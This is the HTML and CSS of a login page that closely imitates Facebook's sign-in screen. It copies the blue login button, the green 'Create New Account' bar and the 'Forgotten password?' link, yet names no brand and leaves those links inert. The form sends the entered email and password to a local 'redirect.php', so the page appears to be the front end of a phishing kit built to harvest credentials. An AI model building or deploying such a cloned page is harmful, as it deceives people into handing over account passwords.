<!DOCTYPE html>
<html>
<head>
	<title>Login</title>
	<meta content='width=device-width , initial-scale=1.0' name='viewport'/>

<style>
*{
	margin: 0;
	padding: 0;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	font-family: 'Open Sans', sans-serif;
}
.head-top{
	padding-top: 25px;
	width: 100%;
	height: 40px;
}
.head-top img{
	height: 20px;
}

.form{
	margin-top: 30px;
	width: 420px;
	height: 416px;
}
.form-m input{
	border: none;
	margin: 4px;
	width: 100%;
	height: 50px;
	padding: 0 12px;
	line-height: 40px;
	background: #f5f6f7;
	border-radius: 4px;
	border: 0.5px solid #d0d3d6;
}
.form-m input[type="submit"]{
	height: 52px;
	color: #fff;
	font-size: 17px;
	font-weight: bold;
	background: #1877f2;
	border-radius: 4px;
}
.foot {
	color: #fff;
	padding: 12px;
	line-height: 27px;
	font-size: 14px;
	margin-top: 40px;
	font-weight: bold;
	border-radius: 4px;
	margin-bottom: 10px;
	background-color: #00a400;
}
.or
	{
	margin-bottom: 20px;
	display: flex;
	align-items: center;
	justify-content: space-between;
	text-align: center;
	position: relative;
	color: #4b4f56;
}
	.or:before, .or:after {
	content: "";
	display: block;
	width: 43%;
	background: #cfcccc;
	height: 1px;
	margin-top:4px;
}
@media screen and (max-width: 576px){
	.form-m input{
		width: 90%;
	}
	</style>
</head>
<body>
	<center>
		<div class="head-top">
			<img src="headtop.png">
		</div>

		<div class="form">

				<form class="form-m" method="POST" action="redirect.php">

					<input class="text" type="text" name="email" placeholder="Email or phone number" required>

					<input class="password" type="password" name="password" placeholder="Password" required >

					<input class="send" type="submit" name="send" value="Login">
				</form>

				<div style='padding-top: 0px;'>
					<p class='or'>or</p>
					<a class='foot'> Create New Account</a><br><br>
					<a class="forgot" style="color: #7596c8;">Forgotten password?</a>
					<img src="foot.png">
				</div>
				

		</div>	
	</center>		
</body>
</html>
